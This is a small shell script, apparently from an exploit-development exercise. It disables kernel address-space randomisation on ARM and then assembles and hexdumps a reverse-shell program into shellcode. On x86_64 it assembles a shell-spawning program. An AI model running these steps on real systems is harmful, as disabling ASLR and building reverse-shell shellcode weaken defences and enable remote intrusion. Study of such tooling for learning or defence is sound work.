#!/bin/sh

if [ $(uname -m) = armv6l ];
then 
	echo 0 > /proc/sys/kernel/randomize_va_space
	as arm_rev_sh.s -o arm_rev_sh.o
	ld -N arm_rev_sh.o -o arm_rev_sh
	objcopy -O binary arm_rev_sh arm_rev_sh.bin
	hexdump -v -e '"\\""x" 1/1 "%02x" ""' arm_rev_sh.bin > shellcode
elif [ $(uname -m) = x86_64];
then
nasm -f elf32 spawn_shell.asm -o spawn_shell.o
ld -m elf_i386 spawn_shell.o -o spawn_shell
else
	echo "1"
fi
